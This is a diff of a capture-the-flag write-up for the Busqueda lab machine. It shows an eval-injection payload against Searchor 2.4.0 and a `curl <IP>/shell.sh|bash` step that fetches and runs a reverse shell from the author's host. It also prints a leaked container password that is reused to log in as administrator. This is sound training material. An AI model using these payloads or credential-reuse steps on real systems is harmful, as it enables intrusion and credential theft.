@@ -22,19 +22,19 @@ We would have to add `searcher.htb` to our `/etc/hosts` file to view the website
 
 This website seems to be a type of search engine using Flask:
 
-<figure><img src="../../.gitbook/assets/image (3211).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3211).png>)
 
 We can submit queries at the bottom using a custom machine and stuff:
 
-<figure><img src="../../.gitbook/assets/image (3832).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3832).png>)
 
 Whatever query we do here, depending on the engine, it would generate a URL for us with a `query` parameter appended at the end:
 
-<figure><img src="../../.gitbook/assets/image (2869).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2869).png>)
 
 It seems that the website rejects any engine that is not present on its list. Running `gobuster` does not seem to reveal anything of interest, so let's take a closer look at the website itself. At the very bottom, it seems there's a link to the software being used, which is Searchor 2.4.0:
 
-<figure><img src="../../.gitbook/assets/image (1744).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1744).png>)
 
 {% embed url="https://github.com/ArjunSharda/Searchor" %}
 
@@ -44,17 +44,17 @@ Looks like we need to do some source code review on this library.
 
 The repository seems to be on v2.5.0, while the website is running v2.4.0. As such, we probably need to dive into the logs of this website to find out what was changed from v2.4.0. Looking at the commit history, we see that there's a `remove eval from search cli method` commit made:
 
-<figure><img src="../../.gitbook/assets/image (1856).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1856).png>)
 
 Here are the changes made:
 
-<figure><img src="../../.gitbook/assets/image (3024).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3024).png>)
 
 This is vulnerbale because it uses `eval` to run the queries. Checking the v ersion, this edit was made for v2.4.2f, which means the machine is running a vulnerable version that is outdated since changes were not made for v2.4.0, specifically in the `query` parameter.
 
 I sent `import('os').system('ping -c 1 10.10.16.41')` as the query, and got a response on `tcpdump`:
 
-<figure><img src="../../.gitbook/assets/image (2335).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2335).png>)
 
 Now, we just need to gain a reverse shell. It seems that `eval` as it cannot process the reverse shells I put in. I found this writeup for a bug bounty that bypasses this by using `compile()`.
 
@@ -66,11 +66,11 @@ However, this exploit would require us to 'close' the previous `eval` function a
 d'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.16.41/test")','a','single'))%2b'
 ```
 
-<figure><img src="../../.gitbook/assets/image (2599).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2599).png>)
 
 All we have to do is change the command to `curl <IP>/shell.sh|bash`.
 
-<figure><img src="../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(796).png>)
 
 With this, we can grab the user flag.
 
@@ -145,12 +145,10 @@ f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up
 
 Based on docker documentation, we would have to specify a format that we want to inspect. I `{{.Config}}` for this and got a few passwords out:
 
-{% code overflow="wrap" %}
 ```
 svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} 960873171e2e
 {960873171e2e   false false false map[22/tcp:{} 3000/tcp:{}] false false false [USER_UID=115 USER_GID=121 GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:3306 GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea] [/bin/s6-svscan /etc/s6] <nil> false gitea/gitea:latest map[/data:{} /etc/localtime:{} /etc/timezone:{}]  [/usr/bin/entrypoint] false  [] map[com.docker.compose.config-hash:e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515 com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:server com.docker.compose.version:1.29.2 maintainer:maintainers@gitea.io org.opencontainers.image.created:2022-11-24T13:22:00Z org.opencontainers.image.revision:9bccc60cf51f3b4070f5506b042a3d9a1442c73d org.opencontainers.image.source:https://github.com/go-gitea/gitea.git org.opencontainers.image.url:https://github.com/go-gitea/gitea]  <nil> []}
 ```
-{% endcode %}
 
 With this, we can try to access the Gitea instance at port 3000 via port forwarding.
 
@@ -167,11 +165,11 @@ chisel server -p 1080 --reverse
 
 Then we can access http://localhost:3000 to view Gitea:
 
-<figure><img src="../../.gitbook/assets/image (1195).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1195).png>)
 
 Using the same MySQL password of `yuiu1hoiu4i5ho1uh`, we can login as `administrator`. We can see some repos:
 
-<figure><img src="../../.gitbook/assets/image (1593).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1593).png>)
 
 And within administrator / scripts repo, we can read the system checkup script:
 
